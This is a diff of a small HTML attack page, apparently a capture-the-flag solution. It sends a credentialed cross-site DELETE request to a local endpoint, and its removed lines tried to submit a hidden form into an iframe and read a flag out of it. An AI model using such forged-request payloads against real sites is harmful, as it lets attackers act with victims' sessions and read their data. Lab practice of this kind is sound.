@@ -5,40 +5,15 @@
 
   
 
-<iframe name="sink"></iframe>
-
-<form id="f"
-      action="http://127.0.0.1:3000/reach_nirvana"
-      method="POST"
-      target="sink">
-</form>
-
 <button>Submit</button>
-
 <script>
 document.querySelector("button").onclick = () => {
-
-    // Send real DELETE using fetch
     fetch("http://127.0.0.1:3000/reach_nirvana", {
         method: "DELETE",
         credentials: "include"
     });
-
-    // Wait a bit, then try to load it in iframe
-    setTimeout(() => {
-        document.getElementById("f").submit();
-    }, 500);
-
-    // After iframe loads, steal its title
-    setTimeout(() => {
-        try {
-            const flag = frames["sink"].document.body.innerText;
-            document.title = flag;
-        } catch(e) {}
-    }, 1000);
 };
 </script>
-
 
   
 </body>
